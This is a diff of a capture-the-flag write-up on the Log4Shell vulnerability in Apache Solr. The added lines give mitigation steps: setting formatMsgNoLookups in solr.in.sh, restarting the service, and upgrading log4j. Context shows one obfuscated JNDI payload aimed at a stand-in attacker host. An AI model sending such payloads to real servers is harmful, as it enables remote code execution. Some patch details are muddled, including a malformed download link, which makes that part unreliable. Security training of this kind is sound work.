@@ -127,7 +127,33 @@ ${${::-j}ndi:rmi://attackerendpoint.com/}
 ```
 # Mitigation
 ## TO PREVENT 
+
 `solr.in.sh` its contain `apache server` config files
+
 `locate solr.in.sh`
+
 1.What is the full path of the specific solr.in.sh file?
+
 Answer:`/etc/default/solr.in.sh`
+
+cd to /etc/default
+
+nano solr.in.sh 'SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"' paste in the file inside
+
+(its solve the expolittation of restict)
+
+And the restart the   command # sudo /etc/init.d/solr restart
+
+Succesfully done ,now we are going to check  agin the exploit
+
+If you check its not receive the request and trigger
+
+# PATCHING
+If  update 2.17.0 latest version 
+Disable jdn
+Where appropriate, please ensure you patch the logging-log4j package to version 2.16.0 or higher (as new releases come available). In version 2.16.0 , JNDI is fully disabled, support for Message Lookups is removed, and the new Dos vulnerability CVE-2021-45046 is not present. Download this release here: https://github.com//logging-log4j2/releases/tag/rel%2F2.16.0
+
+# CREDITS AND AUTHOR NOTES
+
+Room CREATED by JohnHammond
+
